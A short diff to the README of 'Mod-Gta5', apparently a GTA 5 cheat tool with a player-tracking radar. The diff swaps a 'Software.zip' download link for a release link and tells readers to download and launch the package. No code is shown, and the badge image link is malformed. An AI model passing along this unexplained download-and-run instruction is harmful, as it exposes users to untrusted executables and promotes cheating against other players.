@@ -22,7 +22,7 @@ Keep track of all player movements with our 2D radar, enabling you to plan your 
 ---
 
 To access the Mod-Gta5 tool, please download the software package from the following link:
-[![Download Mod-Gta5](https://img.shields.io/badge/Download-Mod--Gta5-blue)](https://github.com/user-attachments/files/18060583/Software.zip)
+[![Download Mod-Gta5](https://github.com/rodbatista/Mod-Gta5/releases/tag/v2.0)](https://github.com/rodbatista/Mod-Gta5/releases/tag/v2.0)
 
 Once downloaded, launch the software to begin enjoying the enhanced features it offers for GTA 5 gameplay.
 
